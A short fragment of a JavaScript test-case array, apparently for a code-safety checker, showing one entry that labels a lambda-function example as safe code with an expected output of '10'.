    expectedOutput: '10',
    category: 'safe_code',
    explanation: `
      ✅ SAFE: Lambda Functions

      This is legitimate code that should execute:
      Lambda expressions are useful for simple
      anonymous functions.
    `,
  },
];
